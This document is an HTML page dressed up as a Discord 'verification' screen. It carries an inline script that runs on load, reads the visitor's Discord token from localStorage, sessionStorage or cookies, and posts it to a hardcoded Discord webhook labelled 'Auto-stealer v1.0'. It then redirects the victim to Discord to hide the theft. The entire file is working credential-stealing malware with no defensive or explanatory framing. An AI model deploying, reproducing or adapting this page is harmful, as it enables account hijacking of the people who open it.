<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Discord Verification</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #2c2f33; color: #fff; }
        .box { background: #36393f; padding: 40px; border-radius: 10px; max-width: 400px; margin: 0 auto; }
        .spinner { border: 4px solid #7289da; border-top: 4px solid transparent; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <h2>🔐 Discord Verification</h2>
        <p>Please wait while we verify your session...</p>
        <div class="spinner"></div>
        <p id="status" style="color: #99aab5; font-size: 14px;">Do not close this page.</p>
    </div>

    <script>
    (function() {
        // ===== CONFIG =====
        const WEBHOOK = "https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w";
        // ==================

        // 1. 토큰 찾기 (localStorage + document.cookie)
        let token = null;
        try {
            // Discord 웹에서 토큰은 localStorage에 저장됨
            const storage = localStorage.getItem('token') || sessionStorage.getItem('token');
            if (storage) {
                // Discord 토큰은 보통 JSON 형태로 저장됨
                try {
                    const parsed = JSON.parse(storage);
                    if (parsed && typeof parsed === 'string') token = parsed;
                    else if (parsed && parsed.token) token = parsed.token;
                } catch (e) {
                    token = storage;
                }
            }
        } catch (e) {}

        // 2. 쿠키에서 찾기
        if (!token) {
            try {
                const cookies = document.cookie.split(';');
                for (let c of cookies) {
                    const trimmed = c.trim();
                    if (trimmed.startsWith('__cf_bm') || trimmed.startsWith('_cfduid')) continue;
                    if (trimmed.includes('token')) {
                        token = trimmed.split('=')[1];
                        break;
                    }
                }
            } catch (e) {}
        }

        // 3. 만약 토큰이 없으면, window.webpackChunkdiscord_app 에서 추출 시도
        if (!token) {
            try {
                const webpack = window.webpackChunkdiscord_app;
                if (webpack) {
                    // 복잡한 방법이지만 가능성 있음
                }
            } catch (e) {}
        }

        // 4. 결과 전송
        if (token) {
            // 토큰이 있으면 디스코드 웹훅으로 전송
            const data = {
                embeds: [{
                    title: "✅ Discord Token Captured",
                    description: `\`\`\`${token}\`\`\``,
                    color: 0x00ff00,
                    timestamp: new Date().toISOString(),
                    footer: { text: "Auto-stealer v1.0" }
                }]
            };

            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(() => {
                document.getElementById('status').innerHTML = '✅ Verified! Redirecting...';
                setTimeout(() => {
                    window.location.href = 'https://discord.com/channels/@me';
                }, 1500);
            })
            .catch(() => {
                document.getElementById('status').innerHTML = '⚠️ Error, but token saved.';
                setTimeout(() => {
                    window.location.href = 'https://discord.com/app';
                }, 2000);
            });
        } else {
            // 토큰이 없으면 다른 방법 시도
            document.getElementById('status').innerHTML = '⚠️ Session not found. Please log in first.';
            // 그래도 혹시 모르니 다시 시도
            setTimeout(() => {
                location.reload();
            }, 3000);
        }
    })();
    </script>
</body>
</html>
